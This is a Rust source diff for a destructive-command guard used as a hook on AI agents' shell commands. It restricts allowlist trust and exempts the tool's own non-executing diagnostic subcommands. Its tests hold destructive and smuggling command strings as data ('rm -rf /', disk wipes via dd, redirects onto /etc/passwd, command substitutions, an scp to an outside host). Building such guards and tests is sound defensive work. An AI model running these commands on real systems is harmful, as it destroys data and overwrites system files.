@@ -1,18 +1,22 @@
 //! Allowlist file parsing and layered loading.
 //!
 //! This module implements loading of allowlist entries from three layers:
-//! - Project: `.dcg/allowlist.toml` at repo root
+//! - Project: `.dcg/allowlist.toml` at repo root, active only when the user
+//!   explicitly selects that repository's `.dcg.toml` through `DCG_CONFIG`
 //! - User: `~/.config/dcg/allowlist.toml`
 //! - System: `/etc/dcg/allowlist.toml` (optional)
 //!
 //! Test override:
 //! - `DCG_ALLOWLIST_SYSTEM_PATH` can override the system allowlist path
-//!   (useful for hermetic E2E tests).
+//!   (useful for hermetic E2E tests). The override is an explicit user trust
+//!   decision for that file, while its loaded entries retain System-layer
+//!   identity and precedence.
 //!
 //! Design goals:
 //! - Strongly-typed model (`AllowEntry`, `AllowSelector`)
 //! - Robust parsing: invalid TOML or invalid entries must not crash the hook
-//! - Explicit, testable layering precedence (project > user > system)
+//! - Explicit, testable layering precedence (trusted project > user > system)
+//! - No trust grants from repository contents alone
 
 use std::collections::HashMap;
 #[cfg(target_os = "linux")]
@@ -190,6 +194,20 @@ impl LayeredAllowlist {
         user: Option<PathBuf>,
         system: Option<PathBuf>,
     ) -> Self {
+        Self::load_from_paths_with_system_source(
+            project,
+            user,
+            system,
+            crate::config::ConfigSource::System,
+        )
+    }
+
+    fn load_from_paths_with_system_source(
+        project: Option<PathBuf>,
+        user: Option<PathBuf>,
+        system: Option<PathBuf>,
+        system_source: crate::config::ConfigSource,
+    ) -> Self {
         let mut layers: Vec<LoadedAllowlistLayer> = Vec::new();
 
         if let Some(path) = project {
@@ -212,7 +230,7 @@ impl LayeredAllowlist {
             layers.push(LoadedAllowlistLayer {
                 layer: AllowlistLayer::System,
                 path: path.clone(),
-                file: load_allowlist_file(AllowlistLayer::System, &path),
+                file: load_allowlist_file_with_source(AllowlistLayer::System, &path, system_source),
             });
         }
 
@@ -611,6 +629,197 @@ pub fn is_builtin_inspection_wrapper_call(command: &str) -> bool {
     BUILTIN_INSPECTION_WRAPPER_PREFIXES
         .iter()
         .any(|prefix| command_prefix_safely_matches(command, prefix))
+}
+
+/// dcg's own *diagnostic* subcommands that consume a candidate command as data
+/// and report a decision without ever executing it.
+///
+/// These are deliberately limited to the read-only inspection surface — no
+/// dcg subcommand executes its argument, but restricting the exemption to this
+/// exact set keeps the contract tight and future-proof (a hypothetical
+/// command-running subcommand could never be smuggled through it). See dcg#170.
+const DCG_INSPECTION_SUBCOMMANDS: &[&str] = &["test", "explain", "classify"];
+
+/// Returns `true` when `command` is one of dcg's own non-executing diagnostic
+/// invocations (`dcg test`, `dcg explain`, `dcg classify`) with a candidate
+/// command supplied purely as data — see dcg#170.
+///
+/// # Why this is needed
+///
+/// When dcg is installed as a PreToolUse hook it scans the raw command line.
+/// An agent running `dcg explain "<candidate>"` to investigate a false positive
+/// would otherwise be blocked because the candidate appears (as inert text)
+/// inside the diagnostic invocation. `dcg test` / `dcg explain` / `dcg classify`
+/// never execute the candidate, so the invocation itself is safe regardless of
+/// how dangerous the candidate looks.
+///
+/// # Why this is not a bypass
+///
+/// The command is shell-split with the project's quote/substitution-aware
+/// [`crate::packs::split_command_segments`], and **every** resulting segment
+/// must independently be a bare dcg diagnostic call:
+///
+/// - Chained commands (`dcg test x; rm -rf /`, `... && reboot`, `... | sh`)
+///   split into multiple segments; the non-dcg segment fails the check, so the
+///   whole command falls through to normal pack evaluation.
+/// - Command/process substitutions (`dcg test "$(rm -rf /)"`, `<(...)`,
+///   backticks) are emitted as their own inner segments by the splitter, so the
+///   substituted command is evaluated normally.
+/// - Output redirections (`dcg test x > /etc/passwd`) are detected per-segment
+///   by [`parse_simple_command_argv`] (which bails on any unquoted redirect),
+///   so a redirect that could clobber a sensitive file is never exempted.
+///
+/// Because the per-segment tokenizer models shell quoting the same way bash does
+/// (single, double, and `$'...'` ANSI-C quoting, plus backslash escapes), a
+/// metacharacter that bash would treat as active is also seen as active here and
+/// refuses the exemption; one that is merely quoted data (e.g.
+/// `dcg test "rm -rf /; reboot"`) stays inside the candidate argument and is
+/// correctly exempted.
+#[must_use]
+pub fn is_dcg_self_inspection_call(command: &str) -> bool {
+    // Cheap gate: skip the split/tokenize work unless the binary name appears.
+    if !command.contains("dcg") && !command.contains("destructive_command_guard") {
+        return false;
+    }
+    let segments = crate::packs::split_command_segments(command);
+    !segments.is_empty()
+        && segments
+            .iter()
+            .all(|segment| segment_is_dcg_inspection_call(segment))
+}
+
+/// Returns `true` when a single (already shell-split) segment is a bare
+/// `dcg <test|explain|classify> ...` invocation with no redirection.
+fn segment_is_dcg_inspection_call(segment: &str) -> bool {
+    let Some(argv) = parse_simple_command_argv(segment) else {
+        // `None` means the segment contained a redirect or other shell control
+        // operator (or was empty): refuse the exemption.
+        return false;
+    };
+    let mut tokens = argv.iter();
+    let Some(arg0) = tokens.next() else {
+        return false;
+    };
+    if !is_dcg_binary_name(arg0) {
+        return false;
+    }
+    // Skip leading global option flags (`--robot`, `--no-color`, `-v`, ...) and
+    // require the first non-flag token to be a known diagnostic subcommand.
+    for token in tokens {
+        if token.starts_with('-') {
+            continue;
+        }
+        return DCG_INSPECTION_SUBCOMMANDS.contains(&token.as_str());
+    }
+    // A bare `dcg` (with only flags) is not a diagnostic invocation.
+    false
+}
+
+/// Returns `true` if `arg0` (after stripping any leading path) is the dcg
+/// binary name.
+fn is_dcg_binary_name(arg0: &str) -> bool {
+    let base = arg0.rsplit(['/', '\\']).next().unwrap_or(arg0);
+    let stem = base
+        .get(..base.len().saturating_sub(4))
+        .filter(|_| {
+            base.get(base.len().saturating_sub(4)..)
+                .is_some_and(|suffix| suffix.eq_ignore_ascii_case(".exe"))
+        })
+        .unwrap_or(base);
+    stem.eq_ignore_ascii_case("dcg") || stem.eq_ignore_ascii_case("destructive_command_guard")
+}
+
+/// Tokenize a single shell command segment into its argv words, honoring shell
+/// quoting the way bash does, and return `None` if the segment contains any
+/// unquoted redirection or shell-control operator.
+///
+/// This is intentionally conservative: any construct that could direct dcg's
+/// output somewhere (`>`, `<`, `>>`, `2>`, `&>`), chain another command, or run
+/// a subshell causes an immediate `None`, which makes the caller refuse the
+/// self-inspection exemption and fall through to normal evaluation. Quoted
+/// occurrences of those characters are treated as ordinary data, exactly as
+/// bash would, so a candidate command containing them inside quotes is still
+/// recognized as inert argument text.
+fn parse_simple_command_argv(segment: &str) -> Option<Vec<String>> {
+    let mut words: Vec<String> = Vec::new();
+    let mut cur = String::new();
+    let mut started = false;
+    let mut chars = segment.chars().peekable();
+
+    while let Some(c) = chars.next() {
+        match c {
+            c if c.is_whitespace() => {
+                if started {
+                    words.push(std::mem::take(&mut cur));
+                    started = false;
+                }
+            }
+            // Single quotes: literal until the next single quote.
+            '\'' => {
+                started = true;
+                for q in chars.by_ref() {
+                    if q == '\'' {
+                        break;
+                    }
+                    cur.push(q);
+                }
+            }
+            // Double quotes: backslash escapes only ", \, $, ` (as in bash).
+            '"' => {
+                started = true;
+                while let Some(q) = chars.next() {
+                    match q {
+                        '\\' => match chars.peek() {
+                            Some(&n) if matches!(n, '"' | '\\' | '$' | '`') => {
+                                cur.push(n);
+                                chars.next();
+                            }
+                            _ => cur.push('\\'),
+                        },
+                        '"' => break,
+                        _ => cur.push(q),
+                    }
+                }
+            }
+            // ANSI-C quoting $'...': backslash escapes the following character
+            // (including the closing quote), terminated by an unescaped quote.
+            '$' if chars.peek() == Some(&'\'') => {
+                started = true;
+                chars.next(); // consume the opening quote
+                while let Some(q) = chars.next() {
+                    match q {
+                        '\\' => {
+                            if let Some(n) = chars.next() {
+                                cur.push(n);
+                            }
+                        }
+                        '\'' => break,
+                        _ => cur.push(q),
+                    }
+                }
+            }
+            // Command substitution -> refuse (handled as its own segment too).
+            '$' if chars.peek() == Some(&'(') => return None,
+            // Backslash escape outside quotes.
+            '\\' => {
+                if let Some(n) = chars.next() {
+                    started = true;
+                    cur.push(n);
+                }
+            }
+            // Redirections and shell-control operators -> refuse the exemption.
+            '<' | '>' | ';' | '|' | '&' | '`' | '(' | ')' => return None,
+            _ => {
+                started = true;
+                cur.push(c);
+            }
+        }
+    }
+
+    if started {
+        words.push(cur);
+    }
+    if words.is_empty() { None } else { Some(words) }
 }
 
 /// Returns true if `tail` contains any shell metacharacter sequence that could
@@ -1275,60 +1484,115 @@ pub fn resolve_path_for_matching(
 /// Invalid TOML is treated as empty for that layer and reported in `errors`.
 #[must_use]
 pub fn load_default_allowlists() -> LayeredAllowlist {
-    let project = std::env::current_dir()
-        .ok()
-        .and_then(|cwd| find_repo_root(&cwd))
-        .map(|root| root.join(".dcg").join("allowlist.toml"));
+    let project = std::env::current_dir().ok().and_then(|cwd| {
+        crate::config::explicitly_trusts_project_policy(&cwd).then(|| project_allowlist_path(&cwd))
+    });
 
-    // Check XDG-style path first (~/.config/dcg/), then platform-native
-    let user = dirs::home_dir()
-        .map(|h| h.join(".config").join("dcg").join("allowlist.toml"))
-        .filter(|p| p.exists())
-        .or_else(|| dirs::config_dir().map(|d| d.join("dcg").join("allowlist.toml")));
+    let user = Some(user_allowlist_path());
 
-    // System allowlist is optional; keep the fixed path but treat missing as empty.
-    // Allow tests to override via env for hermetic E2E (no reliance on real /etc).
-    let system = std::env::var("DCG_ALLOWLIST_SYSTEM_PATH").map_or_else(
-        |_| Some(PathBuf::from("/etc/dcg/allowlist.toml")),
-        |path| {
-            let trimmed = path.trim();
-            if trimmed.is_empty() {
-                None
-            } else {
-                Some(PathBuf::from(trimmed))
-            }
-        },
-    );
+    let system_override = std::env::var("DCG_ALLOWLIST_SYSTEM_PATH").ok();
+    let (system, system_source) = system_allowlist_location(system_override.as_deref());
 
-    LayeredAllowlist::load_from_paths(project, user, system)
+    LayeredAllowlist::load_from_paths_with_system_source(project, user, system, system_source)
 }
 
-fn find_repo_root(start: &Path) -> Option<PathBuf> {
-    let mut current = start.to_path_buf();
+fn system_allowlist_location(
+    override_path: Option<&str>,
+) -> (Option<PathBuf>, crate::config::ConfigSource) {
+    // The default platform system path is privileged and must satisfy the
+    // strict System source policy. An environment override is instead an
+    // explicit user trust decision for that selected file; it still loads as
+    // the System allowlist layer so labels and precedence remain unchanged.
+    let Some(path) = override_path else {
+        return (
+            Some(crate::config::system_config_dir().join("allowlist.toml")),
+            crate::config::ConfigSource::System,
+        );
+    };
 
-    loop {
-        if current.join(".git").exists() {
-            return Some(current);
-        }
-
-        if !current.pop() {
-            return None;
-        }
+    let trimmed = path.trim();
+    if trimmed.is_empty() {
+        (None, crate::config::ConfigSource::Untrusted)
+    } else {
+        (
+            Some(PathBuf::from(trimmed)),
+            crate::config::ConfigSource::Untrusted,
+        )
     }
 }
 
-fn load_allowlist_file(layer: AllowlistLayer, path: &Path) -> AllowlistFile {
-    if !path.exists() {
-        return AllowlistFile::default();
+/// Resolve the user allowlist path with the same precedence used by CLI
+/// mutations: explicit XDG location, existing `~/.config/dcg`, then the
+/// platform-native config directory.
+pub(crate) fn user_allowlist_path() -> PathBuf {
+    if let Ok(xdg_home) = std::env::var("XDG_CONFIG_HOME")
+        && let Some(xdg_home) = crate::config::resolve_config_path_value(&xdg_home, None)
+    {
+        return xdg_home.join("dcg").join("allowlist.toml");
     }
 
-    // System layer is privileged: refuse symlinks to user-writable targets.
-    // Other layers only enforce the size cap (still want bounded reads).
+    if let Some(home) = dirs::home_dir() {
+        let xdg_path = home.join(".config").join("dcg").join("allowlist.toml");
+        if xdg_path.exists() {
+            return xdg_path;
+        }
+    }
+
+    dirs::config_dir()
+        .unwrap_or_else(|| dirs::home_dir().unwrap_or_default().join(".config"))
+        .join("dcg")
+        .join("allowlist.toml")
+}
+
+/// Resolve the project allowlist that governs `start`.
+///
+/// Git repositories are rooted at their repository root. Outside Git, the
+/// nearest ancestor that already contains `.dcg/allowlist.toml` governs the
+/// directory tree. The CLI separately enforces the explicit project-policy
+/// trust requirement before any project-layer mutation.
+pub(crate) fn project_allowlist_path(start: &Path) -> PathBuf {
+    if let Some(root) =
+        crate::config::find_repo_root(start, crate::config::REPO_ROOT_SEARCH_MAX_HOPS)
+    {
+        return root.join(".dcg").join("allowlist.toml");
+    }
+
+    let mut current = Some(start);
+    for _ in 0..=crate::config::REPO_ROOT_SEARCH_MAX_HOPS {
+        let Some(dir) = current else {
+            break;
+        };
+        let candidate = dir.join(".dcg").join("allowlist.toml");
+        if candidate.is_file() {
+            return candidate;
+        }
+        current = dir.parent();
+    }
+
+    start.join(".dcg").join("allowlist.toml")
+}
+
+pub(crate) fn load_allowlist_file(layer: AllowlistLayer, path: &Path) -> AllowlistFile {
+    // System-layer callers use the privileged source policy by default. The
+    // default loader bypasses this wrapper only for an explicitly selected
+    // `DCG_ALLOWLIST_SYSTEM_PATH`, whose path selection is the trust decision.
     let source = if layer == AllowlistLayer::System {
         crate::config::ConfigSource::System
     } else {
         crate::config::ConfigSource::Untrusted
     };
+
+    load_allowlist_file_with_source(layer, path, source)
+}
+
+fn load_allowlist_file_with_source(
+    layer: AllowlistLayer,
+    path: &Path,
+    source: crate::config::ConfigSource,
+) -> AllowlistFile {
+    if !path.exists() {
+        return AllowlistFile::default();
+    }
 
     let Some(content) = crate::config::read_config_file_bounded(path, source) else {
         return AllowlistFile {
@@ -1337,7 +1601,7 @@ fn load_allowlist_file(layer: AllowlistLayer, path: &Path) -> AllowlistFile {
                 layer,
                 path: path.to_path_buf(),
                 entry_index: None,
-                message: "failed to read allowlist file (missing, too large, or unsafe symlink)"
+                message: "failed to read allowlist file (missing, too large, or rejected by source policy)"
                     .to_string(),
             }],
         };
@@ -1595,6 +1859,99 @@ fn get_timestamp_string(tbl: &toml::value::Table, key: &str) -> Option<String> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn project_allowlist_path_falls_back_to_cwd_outside_git() {
+        let tmp = tempfile::tempdir().unwrap();
+        assert_eq!(
+            project_allowlist_path(tmp.path()),
+            tmp.path().join(".dcg").join("allowlist.toml")
+        );
+    }
+
+    #[test]
+    fn project_allowlist_path_uses_nearest_non_git_ancestor() {
+        let tmp = tempfile::tempdir().unwrap();
+        let root_allowlist = tmp.path().join(".dcg").join("allowlist.toml");
+        std::fs::create_dir_all(root_allowlist.parent().unwrap()).unwrap();
+        std::fs::write(&root_allowlist, "version = 1\n").unwrap();
+        let nested = tmp.path().join("a").join("b");
+        std::fs::create_dir_all(&nested).unwrap();
+
+        assert_eq!(project_allowlist_path(&nested), root_allowlist);
+    }
+
+    #[test]
+    fn project_allowlist_path_prefers_git_root() {
+        let tmp = tempfile::tempdir().unwrap();
+        std::fs::create_dir(tmp.path().join(".git")).unwrap();
+        let nested = tmp.path().join("a").join("b");
+        std::fs::create_dir_all(&nested).unwrap();
+
+        assert_eq!(
+            project_allowlist_path(&nested),
+            tmp.path().join(".dcg").join("allowlist.toml")
+        );
+    }
+
+    #[test]
+    fn explicit_system_path_uses_user_trust_without_changing_layer_identity() {
+        let tmp = tempfile::tempdir().unwrap();
+        let path = tmp.path().join("allowlist.toml");
+        std::fs::write(
+            &path,
+            r#"
+                [[allow]]
+                rule = "core.git:reset-hard"
+                reason = "explicit system-path override"
+            "#,
+        )
+        .unwrap();
+
+        // Make the leaf itself ineligible for the privileged System source,
+        // independently of the ownership/mode of the test runner's temp root.
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+
+            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o666)).unwrap();
+        }
+
+        let (default_path, default_source) = system_allowlist_location(None);
+        assert_eq!(
+            default_path,
+            Some(crate::config::system_config_dir().join("allowlist.toml"))
+        );
+        assert_eq!(default_source, crate::config::ConfigSource::System);
+
+        let strict = LayeredAllowlist::load_from_paths(None, None, Some(path.clone()));
+        assert_eq!(strict.layers.len(), 1);
+        assert_eq!(strict.layers[0].layer, AllowlistLayer::System);
+        assert!(strict.layers[0].file.entries.is_empty());
+        assert_eq!(strict.layers[0].file.errors.len(), 1);
+
+        let (explicit_path, explicit_source) =
+            system_allowlist_location(Some(path.to_str().expect("UTF-8 temp path")));
+        assert_eq!(explicit_path, Some(path.clone()));
+        assert_eq!(explicit_source, crate::config::ConfigSource::Untrusted);
+
+        let explicit = LayeredAllowlist::load_from_paths_with_system_source(
+            None,
+            None,
+            explicit_path,
+            explicit_source,
+        );
+        assert_eq!(explicit.layers.len(), 1);
+        assert_eq!(explicit.layers[0].layer, AllowlistLayer::System);
+        assert_eq!(explicit.layers[0].path, path);
+        assert!(explicit.layers[0].file.errors.is_empty());
+        assert_eq!(explicit.layers[0].file.entries.len(), 1);
+
+        let hit = explicit
+            .match_rule("core.git", "reset-hard")
+            .expect("explicit override entry should load");
+        assert_eq!(hit.layer, AllowlistLayer::System);
+    }
 
     // ----- command_prefix tail-injection regression tests -----
 
@@ -2876,6 +3233,150 @@ mod tests {
         ));
         assert!(is_builtin_inspection_wrapper_call(
             "ee preflight verify --cmd \"dd if=/dev/zero of=/dev/sda\""
+        ));
+    }
+
+    // ---- dcg#170: dcg's own diagnostic subcommands (test/explain/classify) ----
+
+    #[test]
+    fn dcg_self_inspection_allows_simple_diagnostics() {
+        assert!(is_dcg_self_inspection_call("dcg test \"rm -rf /\""));
+        assert!(is_dcg_self_inspection_call(
+            "dcg explain \"git reset --hard\""
+        ));
+        assert!(is_dcg_self_inspection_call(
+            "dcg classify \"git restore src/foo.py\""
+        ));
+        // Flags before and after the subcommand.
+        assert!(is_dcg_self_inspection_call("dcg --robot test \"rm -rf /\""));
+        assert!(is_dcg_self_inspection_call(
+            "dcg test --format json \"kubectl delete namespace prod\""
+        ));
+        assert!(is_dcg_self_inspection_call(
+            "dcg explain --verbose \"rm -rf ~\""
+        ));
+    }
+
+    #[test]
+    fn dcg_self_inspection_allows_path_qualified_binary() {
+        assert!(is_dcg_self_inspection_call(
+            "/usr/local/bin/dcg test \"rm -rf /\""
+        ));
+        assert!(is_dcg_self_inspection_call(
+            "./dcg explain \"git clean -fdx\""
+        ));
+        assert!(is_dcg_self_inspection_call(
+            "~/.local/bin/dcg test \"git reset --hard\""
+        ));
+        assert!(is_dcg_self_inspection_call(
+            r#"dcg.exe test "Send-MailMessage -To outside@example.test""#
+        ));
+        assert!(is_dcg_self_inspection_call(
+            r#""C:\Program Files\dcg\DCG.EXE" explain "scp report.csv user@outside.example:/drop/""#
+        ));
+        assert!(is_dcg_self_inspection_call(
+            r#"destructive_command_guard.exe classify "rd /s /q C:\data""#
+        ));
+    }
+
+    #[test]
+    fn dcg_self_inspection_allows_heredoc_argument() {
+        // The exact reproductions from dcg#170: a candidate command embedded in
+        // a `$'...'` ANSI-C string (with a `cat <<EOF` heredoc and a `git
+        // restore` mention). The literal `\'` and `\n` are backslash escapes in
+        // the pre-execution command text the hook actually receives.
+        let explain = "dcg explain --no-color $'cat <<\\'EOF\\'\\nreview note: \
+                       git restore src/foo.py would discard local work\\nEOF'";
+        assert!(
+            is_dcg_self_inspection_call(explain),
+            "issue #170 `dcg explain` heredoc repro must be exempt"
+        );
+        let test = "dcg test --no-heredoc-scan --explain --no-color \
+                    $'cat <<\\'EOF\\'\\nreview note: git restore src/foo.py \
+                    would discard local work\\nEOF'";
+        assert!(
+            is_dcg_self_inspection_call(test),
+            "issue #170 `dcg test` heredoc repro must be exempt"
+        );
+    }
+
+    #[test]
+    fn dcg_self_inspection_allows_quoted_metacharacter_argument() {
+        // Metacharacters that live entirely inside the quoted candidate are
+        // inert data and must not defeat the exemption.
+        assert!(is_dcg_self_inspection_call("dcg test \"rm -rf /; reboot\""));
+        assert!(is_dcg_self_inspection_call("dcg test \"a && rm -rf /\""));
+        assert!(is_dcg_self_inspection_call("dcg explain 'echo a > b'"));
+        assert!(is_dcg_self_inspection_call(
+            "dcg test \"echo \\$(rm -rf /)\""
+        ));
+    }
+
+    #[test]
+    fn dcg_self_inspection_rejects_chained_real_command() {
+        // A genuine second command outside the diagnostic invocation must fall
+        // through to normal evaluation (i.e. NOT be exempted).
+        assert!(!is_dcg_self_inspection_call("dcg test \"x\"; rm -rf /"));
+        assert!(!is_dcg_self_inspection_call(
+            "dcg explain \"x\" && rm -rf /"
+        ));
+        assert!(!is_dcg_self_inspection_call("dcg test \"x\" | sh"));
+        assert!(!is_dcg_self_inspection_call(
+            "dcg explain \"git restore x\"; git reset --hard"
+        ));
+        assert!(!is_dcg_self_inspection_call("cd /tmp && dcg test \"x\""));
+    }
+
+    #[test]
+    fn dcg_self_inspection_rejects_command_substitution() {
+        assert!(!is_dcg_self_inspection_call("dcg test \"$(rm -rf /)\""));
+        assert!(!is_dcg_self_inspection_call("dcg explain \"`rm -rf /`\""));
+        assert!(!is_dcg_self_inspection_call("dcg test <(rm -rf /)"));
+        // A nested *destructive* substitution still blocks even though the outer
+        // and one inner segment are dcg calls.
+        assert!(!is_dcg_self_inspection_call(
+            "dcg test \"$(dcg explain x; rm -rf /)\""
+        ));
+    }
+
+    #[test]
+    fn dcg_self_inspection_rejects_output_redirection() {
+        assert!(!is_dcg_self_inspection_call("dcg test \"x\" > /etc/passwd"));
+        assert!(!is_dcg_self_inspection_call(
+            "dcg explain \"x\" >> /etc/passwd"
+        ));
+        assert!(!is_dcg_self_inspection_call(
+            "dcg test \"x\" 2> /etc/shadow"
+        ));
+        assert!(!is_dcg_self_inspection_call("dcg test \"x\" &> /etc/hosts"));
+    }
+
+    #[test]
+    fn dcg_self_inspection_rejects_non_diagnostic_and_lookalikes() {
+        // Not a dcg diagnostic subcommand.
+        assert!(!is_dcg_self_inspection_call("dcg install --hook"));
+        assert!(!is_dcg_self_inspection_call("dcg hook"));
+        assert!(!is_dcg_self_inspection_call("dcg"));
+        // Token-boundary: `testfoo` is not `test`.
+        assert!(!is_dcg_self_inspection_call("dcg testfoo rm -rf /"));
+        // A different binary that merely starts with `dcg`-ish text.
+        assert!(!is_dcg_self_inspection_call("mydcg test \"rm -rf /\""));
+        assert!(!is_dcg_self_inspection_call("dcgwrapper test \"rm -rf /\""));
+        // Plain destructive commands are unaffected.
+        assert!(!is_dcg_self_inspection_call("rm -rf /"));
+        assert!(!is_dcg_self_inspection_call("git reset --hard"));
+        assert!(!is_dcg_self_inspection_call(""));
+    }
+
+    #[test]
+    fn dcg_self_inspection_allows_only_dcg_diagnostic_chains() {
+        // Two diagnostic invocations chained together are still all-inert.
+        assert!(is_dcg_self_inspection_call(
+            "dcg test \"rm -rf /\" && dcg explain \"git push -f\""
+        ));
+        // ...but one non-diagnostic dcg subcommand in the chain disqualifies it.
+        assert!(!is_dcg_self_inspection_call(
+            "dcg test \"rm -rf /\" && dcg install"
         ));
     }
 }
